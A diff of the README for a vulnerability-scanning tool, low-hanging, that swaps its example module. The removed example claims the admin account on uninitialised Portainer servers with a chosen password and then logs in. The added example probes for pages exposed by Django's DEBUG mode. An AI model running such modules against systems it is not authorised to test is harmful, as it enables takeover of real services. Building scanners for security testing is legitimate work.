@@ -24,25 +24,19 @@ Options:
 Adding modules is quite simple, yet it requires some manual work with imports. This will get improved in the future.
 For now, bear with me and check [example commit](https://github.com/janmasarik/low-hanging/commit/e2ebe80a3bb8f7c7e02c73c48e8caaeb847f18c9).
 
+- Return url in case of detected vulnerability
+- You don't have to handle exceptions, they'll just get swallowed
 ## Example Module
 ```python
-from urllib.parse import urljoin
 from low_hanging.base_worker import BaseWorker
 
-class PortainerAdmin(BaseWorker):
-    name = "portainer_admin_reset"
-    references = ["https://github.com/portainer/portainer/issues/493"]
-    def run(self):
-        r = self.session.post(
-            urljoin(self.domain, "/api/users/admin/init"),
-            json={"username": "admin", "password":"definitely_valid"}
-        )
 
-        if r.status_code in (404, 409):
-            r = self.session.post(
-                urljoin(self.domain, "/api/auth"),
-                json={"username": "admin", "password":"definitely_valid"}
-            )
-            if r.status_code < 400:
-                return r.url  # If successful, return the URL for which the exploit is valid
+class DjangoDebug(BaseWorker):
+    name = "django_debug"
+    references = ["https://stackoverflow.com/questions/14470601/debug-true-django"]
+    def run(self):
+        path = self.random_string()
+        r = self.scrape(path)  # wrapper for self.session.request(method, urljoin(self.domain, path), timeout=5)
+        if "DEBUG" in r.text:
+            return r.url  # If successful, return the URL for which the exploit is valid
 ```
